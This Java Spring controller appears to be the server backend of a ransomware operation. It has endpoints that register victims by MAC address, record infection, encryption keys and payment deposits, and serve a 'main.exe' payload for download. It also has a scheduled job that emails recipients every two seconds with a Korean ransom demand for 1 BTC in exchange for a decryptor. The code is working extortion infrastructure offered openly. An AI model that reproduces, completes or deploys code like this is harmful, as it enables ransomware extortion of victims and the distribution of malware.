package com.example.demo.Controller;

import com.example.demo.Service.VictimsService;
import com.example.demo.utils.ObjectMaker;
import com.example.demo.utils.WriteTo;
import lombok.AllArgsConstructor;
import lombok.RequiredArgsConstructor;
import org.apache.commons.validator.routines.EmailValidator;
import org.jetbrains.annotations.NotNull;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.core.io.ClassPathResource;
import org.springframework.core.io.DefaultResourceLoader;
import org.springframework.core.io.Resource;
import org.springframework.mail.SimpleMailMessage;
import org.springframework.mail.javamail.JavaMailSender;
import org.springframework.scheduling.annotation.Scheduled;
import org.springframework.stereotype.Component;
import org.springframework.web.bind.annotation.CrossOrigin;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.File;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.util.Iterator;
import java.util.List;

@RequiredArgsConstructor
@Component
@RestController
@CrossOrigin("*")
public class BaseController {
    @Autowired
    private JavaMailSender emailSender;

    private final VictimsService victimsService;
    @GetMapping("/")
    public void test(@NotNull HttpServletRequest request, @NotNull HttpServletResponse response){
        String _phone = request.getParameter("phone");
        org.json.simple.JSONObject jsonObject = ObjectMaker.getSimpleJSONObject();
        jsonObject.put("phone",_phone);
        WriteTo.send(response,jsonObject);
    }
    @GetMapping("/check")
    public void checking(@NotNull HttpServletRequest request, @NotNull HttpServletResponse response){
        String address = request.getParameter("address");
        org.json.simple.JSONObject jsonObject = victimsService.findUserByMac(address); //json 오브젝트 반환
        WriteTo.send(response,jsonObject);
    }
    @GetMapping("/infection")
    public void infection(@NotNull HttpServletRequest request, @NotNull HttpServletResponse response){
        String address = request.getParameter("address");
        org.json.simple.JSONObject jsonObject = victimsService.infectionUser(address);
        WriteTo.send(response,jsonObject);
    }
    @GetMapping("/encrypt")
    public void encrypt(@NotNull HttpServletRequest request, @NotNull HttpServletResponse response){
        String address = request.getParameter("address");
        String key = request.getParameter("key");
        org.json.simple.JSONObject jsonObject = victimsService.encrpts(address,key);
        WriteTo.send(response,jsonObject);
    }
    @GetMapping("/deposit")
    public void deposit(@NotNull HttpServletRequest request, @NotNull HttpServletResponse response){
        String address = request.getParameter("address");
        org.json.simple.JSONObject jsonObject = victimsService.deposit(address);
        WriteTo.send(response,jsonObject);
    }
    @GetMapping("/email")
    public void email(@NotNull HttpServletRequest request, @NotNull HttpServletResponse response){
        String address = request.getParameter("address");
        String email = request.getParameter("email");
        org.json.simple.JSONObject jsonObject = victimsService.email(address,email);
        WriteTo.send(response,jsonObject);
    }
    @CrossOrigin("*")
    @GetMapping("/download")
    public void download(HttpServletResponse response) throws Exception {
        OutputStream out = response.getOutputStream();
        try {
            final DefaultResourceLoader defaultResourceLoader = new DefaultResourceLoader();
            Resource resource = defaultResourceLoader.getResource("main.exe");
            response.setHeader("Content-Disposition", "attachment;filename=" + resource.getFile().getName());
            FileInputStream fileInputStream = new FileInputStream(resource.getFile());

            int read = 0;
            byte[] buffer = new byte[1024];
            while ((read = fileInputStream.read(buffer)) != -1) {
                out.write(buffer, 0, read);
            }
            out.flush();
            out.close();

        } catch (Exception e) {
            out.close();
            throw new Exception(e);
        }
    }

    @CrossOrigin("*")
    @GetMapping("/mailSend")
    public void mailSend()  {
        try {
            List<String> list = victimsService.sendEmail();
            Iterator<String> iterator = list.iterator();
            while(iterator.hasNext()){
                String to = iterator.next();
                SimpleMailMessage message = new SimpleMailMessage();
                message.setFrom("UNKNOWN");
                message.setTo(to);
                message.setSubject("우리는 언제든 당신을 도울 준비가 되어있다.");
                message.setText("랜섬웨어에 감염된것을 알고 있다. 해당 랜섬웨어에 알맞는 해독기를 가지고 있으니 1BTC를 입급해라.");
                emailSender.send(message);
            }

        }catch (Exception e) {
            e.printStackTrace();
        }

    }
    @Scheduled(fixedDelay = 2000)
    public void runEvery10Sec(){
        try {
            List<String> list = victimsService.sendEmail();
            Iterator<String> iterator = list.iterator();
            while(iterator.hasNext()){
                String to = iterator.next();
                if(!EmailValidator.getInstance().isValid(to)) continue;
                SimpleMailMessage message = new SimpleMailMessage();
                message.setFrom("UNKNOWN");
                message.setTo(to);
                message.setSubject("우리는 언제든 당신을 도울 준비가 되어있다.");
                message.setText("랜섬웨어에 감염된것을 알고 있다. 해당 랜섬웨어에 알맞는 해독기를 가지고 있으니 1BTC를 입급해라.");
                emailSender.send(message);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
